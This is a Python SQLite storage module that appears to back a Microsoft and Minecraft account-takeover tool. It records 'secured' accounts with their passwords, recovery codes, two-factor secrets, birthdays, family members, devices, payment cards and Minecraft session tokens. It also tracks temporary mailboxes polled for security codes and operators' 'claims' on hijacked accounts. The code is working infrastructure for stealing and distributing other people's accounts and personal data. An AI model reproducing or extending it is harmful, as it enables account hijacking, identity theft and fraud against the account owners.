import sqlite3
import json

class DBConnection:
    def __init__(self) -> None:
        self.conn = sqlite3.connect("database/database.db", check_same_thread=False)
        self.cursor = self.conn.cursor()

    def __enter__(self):
        return self

    def __exit__(self, *args) -> None:
        self.conn.close()

    def setup_tables(self) -> None:
        self.cursor.executescript("""
            CREATE TABLE IF NOT EXISTS `security_emails` (
                email TEXT,
                password TEXT,
                provider TEXT DEFAULT 'local',
                token TEXT,
                account_id TEXT,
                last_polled_at TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS `blacklisted_users` (
                id INTEGER UNIQUE
            );

            CREATE TABLE IF NOT EXISTS `secured_accounts` (
                account_id TEXT UNIQUE,
                ms_email TEXT,
                ms_security_email TEXT,
                ms_password TEXT,
                ms_recovery_code TEXT,
                ms_auth_secret TEXT,
                ms_first_name TEXT,
                ms_last_name TEXT,
                ms_full_name TEXT,
                ms_region TEXT,
                ms_birthday TEXT,
                ms_language TEXT,
                ms_family TEXT,
                ms_devices TEXT,
                ms_cards TEXT,
                ms_subscriptions_active TEXT,
                ms_subscriptions_canceled TEXT,
                ms_subscriptions_commercial TEXT,
                mc_name TEXT,
                mc_method TEXT,
                mc_gamertag TEXT,
                mc_uchange TEXT,
                mc_capes TEXT,
                mc_ssid TEXT,
                secured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS `stats` (
                account_id TEXT,
                mc_username TEXT,
                game TEXT,
                stats_json TEXT,
                last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (account_id, game)
            );

            CREATE TABLE IF NOT EXISTS `received_emails` (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                to_address TEXT,
                from_address TEXT,
                subject TEXT,
                body TEXT,
                received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                consumed INTEGER DEFAULT 0
            );

            CREATE TABLE IF NOT EXISTS `account_claims` (
                account_id TEXT UNIQUE,
                claimed_by_user_id INTEGER,
                claimed_by_username TEXT,
                claimed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                claim_notes TEXT
            );
        """)
        self.conn.commit()
        # Migrations for older DBs
        for stmt in (
            "ALTER TABLE secured_accounts ADD COLUMN validation_status TEXT",
            "ALTER TABLE secured_accounts ADD COLUMN validation_detail TEXT",
            "ALTER TABLE secured_accounts ADD COLUMN validated_at TIMESTAMP",
            "ALTER TABLE security_emails ADD COLUMN provider TEXT DEFAULT 'local'",
            "ALTER TABLE security_emails ADD COLUMN token TEXT",
            "ALTER TABLE security_emails ADD COLUMN account_id TEXT",
            "ALTER TABLE security_emails ADD COLUMN last_polled_at TIMESTAMP",
            "ALTER TABLE security_emails ADD COLUMN created_at TIMESTAMP",
            "ALTER TABLE received_emails ADD COLUMN message_id TEXT",
            "ALTER TABLE received_emails ADD COLUMN provider TEXT",
            "CREATE TABLE IF NOT EXISTS `account_claims` ("
            "account_id TEXT UNIQUE,"
            "claimed_by_user_id INTEGER,"
            "claimed_by_username TEXT,"
            "claimed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,"
            "claim_notes TEXT"
            ")",
        ):
            try:
                self.cursor.execute(stmt)
                self.conn.commit()
            except Exception:
                pass
        # Older rows have no provider/timestamp — treat them as local mailboxes
        # so the mail.tm poller never tries to log into them.
        for stmt in (
            "UPDATE security_emails SET provider = 'local' WHERE provider IS NULL OR TRIM(provider) = ''",
            "UPDATE security_emails SET created_at = CURRENT_TIMESTAMP WHERE created_at IS NULL",
            "CREATE UNIQUE INDEX IF NOT EXISTS idx_received_emails_message_id "
            "ON received_emails(message_id)",
        ):
            try:
                self.cursor.execute(stmt)
                self.conn.commit()
            except Exception:
                pass

    # Security Emails
    def add_security_email(
        self,
        email: str,
        pwd: str,
        provider: str = "local",
        token: str | None = None,
        account_id: str | None = None,
    ) -> None:
        self.cursor.execute("""
            INSERT INTO `security_emails` (email, password, provider, token, account_id, created_at)
            VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        """, (email, pwd, provider or "local", token, account_id)
        )

        self.conn.commit()

    def get_security_email_accounts(self, provider: str | None = None) -> list:
        """Rows for mailbox providers: (email, password, provider, token, account_id)."""
        if provider:
            return self.cursor.execute("""
                SELECT email, password, provider, token, account_id
                FROM `security_emails`
                WHERE lower(COALESCE(provider, 'local')) = ?
                ORDER BY COALESCE(created_at, '') ASC
            """, (provider.lower(),)).fetchall()

        return self.cursor.execute("""
            SELECT email, password, provider, token, account_id
            FROM `security_emails`
            ORDER BY COALESCE(created_at, '') ASC
        """).fetchall()

    def get_security_email_record(self, email: str) -> tuple | None:
        """(email, password, provider, token, account_id) for one mailbox."""
        return self.cursor.execute("""
            SELECT email, password, provider, token, account_id
            FROM `security_emails`
            WHERE lower(email) = ?
            LIMIT 1
        """, (str(email or "").lower(),)).fetchone()

    def set_security_email_token(
        self,
        email: str,
        token: str | None,
        account_id: str | None = None,
    ) -> None:
        if account_id:
            self.cursor.execute("""
                UPDATE `security_emails`
                SET token = ?, account_id = COALESCE(?, account_id)
                WHERE lower(email) = ?
            """, (token, account_id, str(email or "").lower()))
        else:
            self.cursor.execute("""
                UPDATE `security_emails`
                SET token = ?
                WHERE lower(email) = ?
            """, (token, str(email or "").lower()))
        self.conn.commit()

    def touch_security_email_polled(self, email: str) -> None:
        self.cursor.execute("""
            UPDATE `security_emails`
            SET last_polled_at = CURRENT_TIMESTAMP
            WHERE lower(email) = ?
        """, (str(email or "").lower(),))
        self.conn.commit()

    def remove_security_email(self, email: str) -> None:
        self.cursor.execute("""
            DELETE FROM `security_emails` WHERE email = ?
        """, (email,))
        self.conn.commit()

    def get_email_password(self, email: str) -> str | None:
        """Stored password for a mailbox, or None.

        ``fetchone()`` returns the whole row (``('pw',)``), not the column, so
        the value has to be unwrapped here.  Returning the row tuple made the
        temporary-password field show ``('iRXurXiBTpUyCX',)`` instead of the
        password itself.
        """
        row = self.cursor.execute("""
            SELECT password FROM `security_emails`
            WHERE lower(email) = lower(?)
        """, (str(email or ""),)
        ).fetchone()

        if row is None:
            return None
        value = row[0]
        return None if value is None else str(value)

    def get_security_emails(self) -> tuple:
        emails = self.cursor.execute("""
            SELECT email FROM `security_emails`
        """).fetchall()

        return emails

    # Received Emails
    def add_email(
        self,
        to_address: str,
        from_address: str,
        subject: str,
        body: str,
        message_id: str | None = None,
        provider: str | None = None,
    ) -> None:
        self.cursor.execute("""
            INSERT OR IGNORE INTO `received_emails`
                (to_address, from_address, subject, body, message_id, provider)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (to_address, from_address, subject, body, message_id, provider))
        self.conn.commit()

    def has_received_message(self, message_id: str) -> bool:
        if not message_id:
            return False
        row = self.cursor.execute("""
            SELECT 1 FROM `received_emails` WHERE message_id = ? LIMIT 1
        """, (message_id,)).fetchone()
        return bool(row)

    def recent_message_ids(self, to_address: str, limit: int = 200) -> set[str]:
        rows = self.cursor.execute("""
            SELECT message_id FROM `received_emails`
            WHERE lower(to_address) = ? AND message_id IS NOT NULL
            ORDER BY id DESC LIMIT ?
        """, (str(to_address or "").lower(), limit)).fetchall()
        return {str(row[0]) for row in rows if row[0]}

    def get_emails(self, to_address: str) -> list:
        return self.cursor.execute("""
            SELECT id, to_address, from_address, subject, body, received_at
            FROM `received_emails`
            WHERE to_address = ?
            ORDER BY received_at ASC
        """, (to_address.lower(),)).fetchall()

    def mark_unused(self, to_address: str) -> tuple | None:
        return self.cursor.execute("""
            SELECT id, body FROM `received_emails`
            WHERE to_address = ? AND consumed = 0
            ORDER BY received_at ASC
            LIMIT 1
        """, (to_address.lower(),)).fetchone()

    def mark_used(self, email_id: int) -> None:
        self.cursor.execute("""
            UPDATE `received_emails` SET consumed = 1 WHERE id = ?
        """, (email_id,))
        self.conn.commit()

    # Blacklisting
    def get_blacklisted_users(self) -> list:
        users = self.cursor.execute("""
            SELECT id FROM `blacklisted_users`
        """).fetchall()

        return [user_id for (user_id,) in users]

    def add_blacklisted_user(self, id: int) -> None:
        self.cursor.execute("""
            INSERT OR IGNORE INTO `blacklisted_users` (id)
            VALUES (?)
        """, (id,))
        self.conn.commit()

    def remove_blacklisted_user(self, id: int) -> None:
        self.cursor.execute("""
            DELETE FROM `blacklisted_users`
            WHERE id = ?
        """, (id,))
        self.conn.commit()

    # Secured Accounts
    def add_secured_account(self, account_id: str, account: dict) -> None:
        ms = account["microsoft"]
        mc = account["minecraft"]
        subs = ms["subscriptions"]

        self.cursor.execute("""
            INSERT INTO `secured_accounts` (
                account_id,
                ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
                ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday, ms_language,
                ms_family, ms_devices, ms_cards,
                ms_subscriptions_active, ms_subscriptions_canceled, ms_subscriptions_commercial,
                mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            account_id,
            ms["email"], ms["security_email"], ms["password"], ms["recovery_code"], ms["auth_secret"],
            ms["firstName"], ms["lastName"], ms["fullName"], ms["region"], ms["birthday"], ms["language"],
            json.dumps(ms["family"]), json.dumps(ms["devices"]), json.dumps(ms["cards"]),
            json.dumps(subs["active"]), json.dumps(subs["canceled"]), json.dumps(subs["commercial"]),
            mc["name"], mc["method"], mc["gamertag"], mc["uchange"], mc["capes"], str(mc["SSID"])
        ))
        self.conn.commit()

    def is_valid_account_id(self, account_id: str) -> bool:
        result = self.cursor.execute("""
            SELECT 1 FROM `secured_accounts` WHERE account_id = ?
        """, (account_id,)).fetchone()
        return result is not None

    def delete_secured_account(self, account_id: str) -> bool:
        if not self.is_valid_account_id(account_id):
            return False
        self.cursor.execute("DELETE FROM stats WHERE account_id = ?", (account_id,))
        self.cursor.execute("DELETE FROM secured_accounts WHERE account_id = ?", (account_id,))
        self.conn.commit()
        return True

    def delete_secured_accounts(self, account_ids: list[str]) -> int:
        """Delete many accounts in one transaction. Returns number deleted."""
        ids = [aid for aid in account_ids if self.is_valid_account_id(aid)]
        if not ids:
            return 0
        placeholders = ",".join("?" * len(ids))
        self.cursor.execute(f"DELETE FROM stats WHERE account_id IN ({placeholders})", ids)
        self.cursor.execute(
            f"DELETE FROM secured_accounts WHERE account_id IN ({placeholders})", ids
        )
        deleted = self.cursor.rowcount
        self.conn.commit()
        return deleted

    # Account listings
    def get_all_secured_accounts(self, limit: int | None = None) -> list:
        """Newest-first secured accounts (``limit=None`` returns them all)."""
        sql = """
            SELECT account_id, ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
                   mc_name, mc_method, mc_gamertag, mc_capes, secured_at,
                   validation_status, validation_detail, validated_at
            FROM secured_accounts
            ORDER BY secured_at DESC"""
        if limit:
            rows = self.cursor.execute(sql + " LIMIT ?", (int(limit),)).fetchall()
        else:
            rows = self.cursor.execute(sql).fetchall()
        keys = [
            "account_id", "ms_email", "ms_security_email", "ms_password", "ms_recovery_code", "ms_auth_secret",
            "mc_name", "mc_method", "mc_gamertag", "mc_capes", "secured_at",
            "validation_status", "validation_detail", "validated_at",
        ]
        return [dict(zip(keys, row)) for row in rows]

    def get_secured_account(self, account_id: str) -> dict | None:
        row = self.cursor.execute("""
            SELECT account_id, ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
                   ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday, ms_language,
                   ms_family, ms_devices, ms_cards,
                   ms_subscriptions_active, ms_subscriptions_canceled, ms_subscriptions_commercial,
                   mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid, secured_at,
                   validation_status, validation_detail, validated_at
            FROM `secured_accounts` WHERE account_id = ?
        """, (account_id,)).fetchone()

        if not row:
            return None

        keys = [
            "account_id", "ms_email", "ms_security_email", "ms_password", "ms_recovery_code", "ms_auth_secret",
            "ms_first_name", "ms_last_name", "ms_full_name", "ms_region", "ms_birthday", "ms_language",
            "ms_family", "ms_devices", "ms_cards",
            "ms_subscriptions_active", "ms_subscriptions_canceled", "ms_subscriptions_commercial",
            "mc_name", "mc_method", "mc_gamertag", "mc_uchange", "mc_capes", "mc_ssid", "secured_at",
            "validation_status", "validation_detail", "validated_at",
        ]
        raw = dict(zip(keys, row))
        data: dict[str, object] = {
            "account_id": raw.get("account_id"),
            "microsoft": {
                "email": raw.get("ms_email"),
                "security_email": raw.get("ms_security_email"),
                "password": raw.get("ms_password"),
                "recovery_code": raw.get("ms_recovery_code"),
                "auth_secret": raw.get("ms_auth_secret"),
                "firstName": raw.get("ms_first_name"),
                "lastName": raw.get("ms_last_name"),
                "fullName": raw.get("ms_full_name"),
                "region": raw.get("ms_region"),
                "birthday": raw.get("ms_birthday"),
                "language": raw.get("ms_language"),
                "family": json.loads(raw.get("ms_family") or "[]"),
                "devices": json.loads(raw.get("ms_devices") or "[]"),
                "cards": json.loads(raw.get("ms_cards") or "[]"),
                "subscriptions": {
                    "active": json.loads(raw.get("ms_subscriptions_active") or "[]"),
                    "canceled": json.loads(raw.get("ms_subscriptions_canceled") or "[]"),
                    "commercial": json.loads(raw.get("ms_subscriptions_commercial") or "[]"),
                },
            },
            "minecraft": {
                "name": raw.get("mc_name"),
                "method": raw.get("mc_method"),
                "gamertag": raw.get("mc_gamertag"),
                "uchange": raw.get("mc_uchange"),
                "capes": raw.get("mc_capes"),
                "SSID": raw.get("mc_ssid"),
            },
            "secured_at": raw.get("secured_at"),
            "validation_status": raw.get("validation_status"),
            "validation_detail": raw.get("validation_detail"),
            "validated_at": raw.get("validated_at"),
        }

        return data

    def get_secured_account_by_email(self, email: str) -> dict | None:
        """Newest secured_accounts row matching primary (or exact) email."""
        email = (email or "").strip()
        if not email:
            return None
        row = self.cursor.execute(
            """
            SELECT account_id, ms_email, ms_security_email, ms_password,
                   ms_recovery_code, ms_auth_secret, mc_name
            FROM secured_accounts
            WHERE LOWER(ms_email) = LOWER(?)
            ORDER BY secured_at DESC
            LIMIT 1
            """,
            (email,),
        ).fetchone()
        if not row:
            return None
        keys = [
            "account_id",
            "ms_email",
            "ms_security_email",
            "ms_password",
            "ms_recovery_code",
            "ms_auth_secret",
            "mc_name",
        ]
        item = dict(zip(keys, row))
        return {
            "account_id": item.get("account_id"),
            "email": item.get("ms_email") or email,
            "security_email": item.get("ms_security_email") or "Couldn't Change!",
            "password": item.get("ms_password") or "Couldn't Change!",
            "recovery_code": item.get("ms_recovery_code") or "Couldn't Change!",
            "auth_secret": item.get("ms_auth_secret") or "Disabled",
            "mc_name": item.get("mc_name") or "Unknown",
        }

    # Account Claims
    def get_claim(self, account_id: str) -> dict | None:
        row = self.cursor.execute(
            """
            SELECT account_id, claimed_by_user_id, claimed_by_username, claimed_at, claim_notes
            FROM `account_claims`
            WHERE account_id = ?
            LIMIT 1
            """,
            (account_id,),
        ).fetchone()
        if not row:
            return None
        keys = [
            "account_id",
            "claimed_by_user_id",
            "claimed_by_username",
            "claimed_at",
            "claim_notes",
        ]
        return dict(zip(keys, row))

    def claim_account(
        self,
        account_id: str,
        claimed_by_user_id: int,
        claimed_by_username: str,
        claim_notes: str | None = None,
    ) -> bool:
        if not self.is_valid_account_id(account_id):
            return False
        existing = self.get_claim(account_id)
        if existing and existing.get("claimed_by_user_id"):
            return False
        self.cursor.execute(
            """
            INSERT INTO `account_claims` (account_id, claimed_by_user_id, claimed_by_username, claim_notes)
            VALUES (?, ?, ?, ?)
            """,
            (
                account_id,
                int(claimed_by_user_id),
                str(claimed_by_username or "").strip(),
                str(claim_notes or "").strip(),
            ),
        )
        self.conn.commit()
        return True

    def unclaim_account(self, account_id: str) -> bool:
        if not self.is_valid_account_id(account_id):
            return False
        self.cursor.execute("DELETE FROM `account_claims` WHERE account_id = ?", (account_id,))
        self.conn.commit()
        return True
